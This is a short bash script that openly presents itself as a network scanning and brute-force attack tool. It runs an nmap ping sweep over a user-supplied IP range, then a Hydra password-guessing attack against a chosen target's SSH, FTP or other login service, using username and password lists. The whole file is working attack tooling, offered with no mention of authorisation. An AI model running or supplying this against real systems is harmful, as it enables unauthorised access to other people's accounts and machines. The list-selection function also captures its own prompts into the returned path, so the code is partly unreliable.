#!/bin/bash

# Enhanced Script for Network Scanning and Brute-Force Attack

echo "Welcome to the Network Scanning and Brute-Force Attack Script"

# Function to scan the network
network_scan() {
    echo "Enter the IP range for scanning (e.g., 192.168.1.0/24): "
    read ip_range
    echo "Starting network scan on $ip_range..."
    sudo nmap -sP $ip_range
    echo "Network scan completed."
}

# Function to select or input username/password list
select_or_input_list() {
    echo "Enter the directory path where your lists are stored: "
    read list_directory

    echo "1. Use a predefined list from $list_directory"
    echo "2. Enter a custom list path"
    read choice

    if [ "$choice" -eq 1 ]; then
        # List available files in the specified directory
        echo "Available lists in $list_directory:"
        ls $list_directory
        echo "Enter the name of the list file you want to use: "
        read list_name
        echo "$list_directory/$list_name"
    else
        echo "Enter the full path of your custom list: "
        read custom_list
        echo "$custom_list"
    fi
}

# Function to perform brute-force attack
brute_force_attack() {
    echo "Enter the IP of the target: "
    read target_ip

    echo "Select Username List"
    username_list=$(select_or_input_list)
    echo "Selected Username List: $username_list"

    echo "Select Password List"
    password_list=$(select_or_input_list)
    echo "Selected Password List: $password_list"

    # Define the service you are targeting, e.g., ftp, ssh
    echo "Enter the service for brute-force attack (e.g., ssh, ftp): "
    read service

    # Run Hydra
    echo "Starting Hydra attack..."
    hydra -L $username_list -P $password_list $target_ip $service
    echo "Hydra attack finished."
}

# Ask user if they want to perform network scanning
echo "Would you like to scan the network? (yes/no)"
read scan_answer
if [ "$scan_answer" = "yes" ]; then
    network_scan
fi

# Ask user if they want to perform brute-force attack
echo "Would you like to perform a brute-force attack? (yes/no)"
read brute_force_answer
if [ "$brute_force_answer" = "yes" ]; then
    brute_force_attack
fi

echo "Script execution completed."
